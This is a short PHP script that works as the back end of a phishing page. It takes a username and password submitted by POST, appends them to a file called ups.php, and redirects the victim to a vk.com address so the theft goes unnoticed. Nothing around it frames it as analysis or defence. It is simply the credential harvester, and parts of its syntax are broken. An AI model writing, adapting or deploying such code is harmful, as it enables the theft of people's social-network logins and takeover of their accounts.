<?

$Login = $_POST[zabor];

$Pass = $_POST['zena'];

$log = fopen("ups.php","a+");

fwrite($log,"<br> $Login:$Pass \n");

fclose($log);

echo<html><head><META HTTP-EQUIV='Refresh' content = '0; URL=http://vk.com/tulenta'></head></html>

?>